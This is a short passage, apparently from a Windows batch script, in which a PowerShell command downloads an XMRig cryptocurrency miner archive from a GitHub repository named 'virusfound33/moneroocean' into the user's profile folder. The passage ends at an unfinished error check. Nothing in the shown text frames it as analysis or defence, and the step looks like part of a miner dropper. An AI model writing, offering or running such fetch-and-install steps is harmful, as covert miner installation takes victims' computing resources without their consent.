...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/virusfound33/moneroocean/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
